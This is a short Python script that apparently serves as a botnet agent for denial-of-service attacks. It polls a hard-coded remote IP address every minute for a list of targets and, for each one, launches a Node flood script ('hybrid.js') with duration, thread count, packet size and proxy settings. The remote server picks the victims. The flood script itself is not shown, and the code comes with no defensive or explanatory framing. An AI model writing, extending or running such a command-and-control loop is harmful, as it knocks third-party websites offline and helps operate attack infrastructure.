import json
import subprocess
import time
import requests

JSON_URL = "http://121.127.37.120/targets.json"
CHECK_INTERVAL = 60 

def load_targets():
    response = requests.get(JSON_URL)
    if response.status_code == 200:
        return response.json()
    else:
        return None

def run_attack(target):
    url = target["url"]
    port = target.get("port", 443)
    duration = target.get("duration", 120)
    threads = target.get("threads", 20)
    size = target.get("size", 64)
    proxy_file = target.get("proxy_file", "proxy.txt")

    command = ["node", "hybrid.js", url, str(duration), str(threads), str(size), proxy_file]
    subprocess.Popen(command)

def main():
    while True:
        targets = load_targets()
        if targets:
            for target in targets.get("targets", []):
                run_attack(target)
        time.sleep(CHECK_INTERVAL)

if __name__ == "__main__":
    main()